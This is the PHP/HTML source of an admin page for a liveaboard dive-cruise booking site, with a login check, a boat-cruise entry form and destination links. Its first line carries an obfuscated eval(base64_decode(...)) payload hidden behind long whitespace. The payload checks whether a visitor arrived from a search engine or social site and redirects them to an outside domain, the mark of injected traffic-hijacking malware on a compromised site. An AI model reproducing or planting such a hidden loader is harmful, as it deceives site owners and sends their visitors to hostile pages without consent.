<?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwokcWF6cGxtPWhlYWRlcnNfc2VudCgpOwppZiAoISRxYXpwbG0pewokcmVmZXJlcj0kX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107CiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwppZiAoJHVhZykgewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFuZGV4Iikgb3Igc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiYWlkdS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJkb3VibGVjbGljay5uZXQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiY2xpY2tiYW5rLm5ldCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJsb2dzcG90LmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7CmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7CiAgICBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm91bmRjdWJlLmJlZS5wbC8iKTsKCWV4aXQoKTsKCX0KCX0KCX0KCX0="));	                                       			 session_start();
if(!isset($_SESSION['signid'])){header("location:login.php");}
define( '_VALID_MOS', 1 );
require_once('../mod/conn.php');$id=$database->getEscaped($_GET[trim(id)]);
if(!$id){ $id=$database->getEscaped($_POST[trim(id)]);}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD><TITLE>Liveaboards - Dive &amp; Cruises</TITLE>
<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
<STYLE type=text/css></STYLE>

<META content="MSHTML 6.00.2800.1476" name=GENERATOR>
   <script language="JavaScript">
 function confirmlogout(){
    if( window.confirm("Logout ?")=="1" ) {
	  return true;
   } else {
	  	return false;
    }
 }

  function confirmdel(){
    if( window.confirm("Delete Record?")=="1" ) {
	  return true;
   } else {
	  	return false;
    }
 }

 function confirmempty(){
    if( window.confirm("Empty Records ?")=="1" ) {
	  return true;
   } else {
	  	return false;
    }
 }
 </script>
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_jumpMenu(targ,selObj,restore){ //v3.0
  eval(targ+".location='"+selObj.options[selObj.selectedIndex].value+"'");
  if (restore) selObj.selectedIndex=0;
}
//-->
</script>

<script language="JavaScript" type="text/JavaScript">
function validasi_form() {
if (document.frm_add.boat_code.value=="")  {
		   window.alert("Please Input The Boat Code!"); this.document.frm_add.boat_code.focus(); return false;
	} else {
		if (document.frm_add.boat_name.value=="") {
			window.alert("Please Input The Boat Name!"); this.document.frm_add.boat_name.focus(); return false;
	} else {
		if (document.frm_add.boat_type.value=="") {
			window.alert("Please Input The Boat Type!"); this.document.frm_add.boat_type.focus(); return false;
	} else {
		if (document.frm_add.destination.value=="") {
			window.alert("Please Input The Destination!"); this.document.frm_add.destination.focus(); return false;
	} else {
		if (document.frm_add.derive.value=="") {
			window.alert("Please Input The Derivation!"); this.document.frm_add.derive.focus(); return false;
	} else {
		if (document.frm_add.departure_date_yyyy.value>document.frm_add.return_date_yyyy.value) {
			window.alert("Please Input The Valid Date!"); this.document.frm_add.departure_date_yyyy.focus(); return false;
	} else {
		if (document.frm_add.departure_time.value=="") {
			window.alert("Please Input The Departure Time!"); this.document.frm_add.departure_time.focus(); return false;
	} else {
		if (document.frm_add.return_time.value=="") {
			window.alert("Please Input The Return Time!"); this.document.frm_add.return_time.focus(); return false;
	} else {
		if (document.frm_add.link_details.value=="") {
			window.alert("Please Input The Link for Details Page!"); this.document.frm_add.link_details.focus(); return false;
	} else {
		if (document.frm_add.link_area.value=="") {
			window.alert("Please Input The Link for Area Page!"); this.document.frm_add.link_area.focus(); return false;
	} else {
		if (document.frm_add.category.value=="") {
			window.alert("Please Input The Category!"); this.document.frm_add.category.focus(); return false;
	} else {
		if (document.frm_add.price.value=="") {
			window.alert("Please Input The Price!"); this.document.frm_add.price.focus(); return false;
	} else {
		if (document.frm_add.duration.value=="") {
			window.alert("Please Input The Duration!"); this.document.frm_add.duration.focus(); return false;
	} else {return true; }
}}}}}}}}}}}}}


</script>
<style>
  body, td, p, input, select { font-family: Verdana, Arial, Helvetica; font-size: 8pt; color: #000000; }
  a { color: #000000; }
  A:active {
	COLOR: #FF9900;
	TEXT-DECORATION: none
}
A:visited {
	COLOR: #0000CC; TEXT-DECORATION: none
}
A:link {
	COLOR: #FF9900;
	TEXT-DECORATION: none
}
A:hover {
	COLOR: #0000CC;
	TEXT-DECORATION: underline
}
.style1 {
	font-size: 12px;
	font-weight: bold;
}
.style27 {color: #0033CC}
.style30 {color: #0033CC; font-weight: bold; }
.style31 {color: #FFFFFF}
.style36 {font-size: 9px}
.style38 {font-size: 9}
.style39 {color: #0033CC; font-size: 9; font-weight: bold; }
.style48 {font-family: Verdana, Arial, Helvetica, sans-serif}
.style49 {font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 9px;
	font-weight: bold;
}
.style51 {font-size: 9px;
	font-weight: bold;
}
.style80 {color: #0033CC;
	font-weight: bold;
	font-size: 10px;
	font-family: Verdana, Arial, Helvetica, sans-serif;
}
.style82 {font-size: 10px}
.style83 {font-size: 12px;
	font-weight: bold;
}
.style83 {font-size: 10px; font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; }
</style>
<script src="data/Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
</HEAD>
<BODY bottomMargin=0 bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0
marginheight="0" marginwidth="0">
<TABLE width="775" border=0 align="center" cellPadding=0 cellSpacing=0>
  <TBODY>
  <TR>
    <TD>
      <TABLE height=194 cellSpacing=0 cellPadding=0 width="100%"
      background="../images/z3.gif" border=0>
        <TBODY>
        <TR>
              <TD height="194" vAlign=top>
                <TABLE cellSpacing=0 cellPadding=0 width="100%"
            background="../images/dotline.gif"
              border=0><TBODY>
              <TR>
                <TD height=1><IMG height=1
                  src="../images/dotline.gif"
              width=3></TD></TR></TBODY></TABLE>
                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                  <tr>
                    <td width="332" height="171" valign="bottom" background="../images/z1.jpg">
<TABLE width="180" height=40
                              border=0 align="right" cellPadding=2 cellSpacing=0>
                        <TBODY>
                          <TR>
                            <TD bgcolor="#ffffff"><IMG height=40
                                src="../images/m3.jpg"
                                width=67></TD>
                            <TD bgcolor="#ffffff"><IMG height=40
                                src="../images/m4.jpg"
                                width=67></TD>
                            <TD bgcolor="#ffffff"><IMG height=40
                                src="../images/m2.jpg"
                                width=67></TD>
                          </TR>
                          <TR>
                            <TD colspan="3"><img src="../images/spacer.gif" width="10" height="67"></TD>
                          </TR>
                        </TBODY>
                      </TABLE>
                      <div align="left">
                        <table width="115"  border="0" align="left" cellpadding="0" cellspacing="0">
                          <tr>
                            <td width="112">&nbsp;</td>
                          </tr>
                          <tr>
                            <td>&nbsp;</td>
                          </tr>
                          <tr>
                            <td height="22">&nbsp;</td>
                          </tr>
                          <tr>
                            <td><div align="center"><img src="../images/germanflag.gif" width="43" height="30" border="0" usemap="#MapMap"><br>
                                    <strong>Deutsche Webseite </strong>
                                    <map name="MapMap">
                                      <area shape="rect" coords="0,-12,41,28" href="../german/data/login.php">
                                    </map>
                            </div></td>
                          </tr>
                        </table>
                      </div></td>
                    <td width="123" background="../images/z2.jpg">&nbsp;</td>
                    <td width="320" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td><img src="../images/spacer.gif" width="10" height="45"></td>
                        </tr>
                        <tr>
                          <td height="22" valign="top">&nbsp;&nbsp;<span class="style1"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif"><a href="../index.php">Home</a></font></span></td>
                        </tr>
                        <tr>
                          <td><img src="../images/m1.jpg" width="325" height="104"></td>
                        </tr>
                      </table></td>
                  </tr>
                  <tr>
                    <td colspan="3" bgcolor="#006699"> <div align="right"><strong><font size="2" face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></strong></div></td>
                  </tr>
                </table></TD></TR></TBODY></TABLE></TD></TR>
  <TR>
    <TD bgColor=#ffffff>
      <TABLE cellSpacing=0 cellPadding=0 width="775" border=0>
        <TBODY>
        <TR>
              <TD width=330 align=middle vAlign=top bgcolor="#41C9D7"> <table width="100%" border="0" cellspacing="0" cellpadding="0">
                  <tr>
                    <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
                        <tr>
                          <td height="176" valign="top" background="../images/bgsearch.jpg">

                            <table width="88%" border="0" align="right" cellpadding="0" cellspacing="0">
              <tr>
                <td height="42">&nbsp;</td>
              </tr>
              <tr>
                <td><?php	                                       			 include "../mod/mod_search.php"; ?></td>
              </tr>
            </table></td>
                        </tr>
                      </table></td>
                  </tr>
                  <tr>
                    <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                        <td height="176" valign="top" background="../images/bgdestination.jpg"><table width="87%" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td height="33" colspan="2">&nbsp;</td>
                            </tr>
                            <tr>
                              <td width="9%"><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
                              <td width="91%" height="18" class="style83"><div align="center"><span class="style27"><strong><span class="style27 style36"><span class="style27 style38"><span class="style1 style27 style49 style51 style48"><span class="style51 style82"><a href="../german/boats/liburan_index.php" class="style83">Bunaken Marine Park - Sulawesi </a></span></span></span></span></strong></span></div></td>
                            </tr>
                            <tr>
                              <td>&nbsp;</td>
                              <td height="18" class="style1 style48 style82"><div align="center"></div></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
                              <td height="18" class="style83"><div align="center"><span class="style80"><a href="../german/boats/kararu_index.php">Komodo National Park,Flores,Alor</a></span></div></td>
                            </tr>
                            <tr>
                              <td>&nbsp;</td>
                              <td height="18" class="style1 style48 style82"><div align="center"></div></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
                              <td height="18" class="style83"><div align="center"><span class="style27"><strong><span class="style27 style36"><span class="style27 style38"><span class="style1 style27 style49 style51 style48"><span class="style51 style82"><a href="../german/boats/wallacea_index.php" class="style83">Sulwesi- Togian und Banggai Islands </a></span></span></span></span></strong></span></div></td>
                            </tr>
                            <tr>
                              <td>&nbsp;</td>
                              <td height="18" class="style1 style48 style82"><div align="center"></div></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
                              <td height="18" class="style83"><div align="center"><a href="../german/boats/moana_index.php" class="style39">Komodo Island &amp; Irian Jaya</a></div></td>
                            </tr>
                            <tr>
                              <td>&nbsp;</td>
                              <td height="18" class="style1 style48 style82"><div align="center"></div></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
                              <td height="18" class="style83"><div align="center"><a href="../german/boats/ombak_index.php">Komodo Marine Park </a></div></td>
                            </tr>
                            <tr>
                              <td>&nbsp;</td>
                              <td height="18" class="style1 style48 style82"><div align="center"></div></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
                              <td height="18" class="style83"><div align="center" class="style83">
                                  <div align="center"><a href="../german/boats/seasafari_index.php" class="style83">Irian, Raja Ampat, Misool, Ambon<br>
                                    &quot;Exclusive Liveaboard&quot; </a></div>
                              </div></td>
                            </tr>
                            <tr>
                              <td>&nbsp;</td>
                              <td height="18" class="style1 style48 style82"><div align="center"></div></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
                              <td height="18" class="style83"><div align="center"><a href="../german/boats/katharina_index.php" class="style83">Bali-Flores-Bali Exploration Cruises&quot;</a></div></td>
                            </tr>
                            <tr>
                              <td>&nbsp;</td>
                              <td height="18" class="style1 style48 style82"><div align="center"></div></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
                              <td height="18" class="style83"><div align="center"><a href="../german/boats/jingojango_index.php" class="style83">Flores-Komodo-Bali-Lombok <br>
                                Tauch- &amp; Erkundungsfahrten</a></div></td>
                            </tr>
                            <tr>
                              <td>&nbsp;</td>
                              <td height="18" class="style1 style48 style82"><div align="center"></div></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
                              <td height="18" class="style83"><div align="center"><a href="../german/boats/duyung_index.php" class="style83">Selayar &amp; Takabonerate Tauchfahrten</a></div></td>
                            </tr>
                            <tr>
                              <td>&nbsp;</td>
                              <td height="18" class="style1 style48 style82"><div align="center"></div></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
                              <td height="18" class="style83"><div align="center" class="style83">
                                  <div align="center"><a href="../german/boats/philkade_index.php">Dive Komodo National Park</a></div>
                              </div></td>
                            </tr>
                            <tr>
                              <td>&nbsp;</td>
                              <td height="18" class="style1 style48 style82"><div align="center"></div></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
                              <td height="18" class="style83"><div align="center"><a href="../german/boats/ondina_index.php">Maluku, Bira, Selayar, Irian Jaya</a></div></td>
                            </tr>
                            <tr>
                              <td height="18" colspan="2"><div align="center">
                                  <p><br>
                                      <img src="../images/hot-deals.jpg" alt="Sonderangebote &amp; Last Minute" width="103" height="24" border="2" usemap="#Map"></p>
                              </div></td>
                            </tr>
                            <tr>
                              <td colspan="2"><img src="images/spacer.gif" width="10" height="8"></td>
                            </tr>
                          </table>
                            <map name="Map">
                              <area shape="rect" coords="-5,-1,104,27" href="dive_resort_tulamben/index.php" target="_blank" alt="Tauchkreuzfahrt Sonderangebote &amp; Last Minute">
                          </map></td>
                      </tr>
                    </table></td>
                  </tr>
                </table>
                <br>
              <br>              </TD>
          <TD vAlign=top width=5
          background="../images/z6.jpg"><IMG height=4
            src="../images/z6.jpg" width=5></TD>
          <TD vAlign=top>
            <TABLE cellSpacing=3 cellPadding=5 width=430 border=0>
                  <TBODY>
                    <TR>
                      <TD height="28">Welcome <?php	                                       			 echo($_SESSION['name']);   ?></TD>
                    </TR>
                    <TR>
                      <TD height="28"><a href="admin.php">Back to List</a> | <a href="cruises.php">Add</a> | <a href="admin.php?id=<?php	                                       			 echo ($id);?>" onClick="return confirmdel()">Delete</a> | <a href="logout.php" onClick="return confirmlogout()">Logout</a></TD>
                    </TR>
                    <TR>
                      <TD height="28"><hr size="1" noshade></TD>
                    </TR>
                    <TR>
                      <TD height="28">
                        <?php	                                       			 include "../mod/mod_cruises.php";?>
                      </TD>
                    </TR>
                  </TBODY>
                </TABLE></TD></TR></TBODY></TABLE></TD></TR>
  <TR>
    <TD>
      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%"
      background="../images/z4.gif" border=0>
          <TBODY>
            <TR>
              <TD height="8"><img src="../images/spacer.gif" width="10" height="8"></TD>
            </TR>
            <TR>
              <TD height="18" bgcolor="#FFFFFF"><div align="center">2005 &copy;
                  Copyright Liveaboard. All rights Reserved</div></TD>
            </TR>
          </TBODY>
        </TABLE></TD></TR></TBODY></TABLE></BODY></HTML>
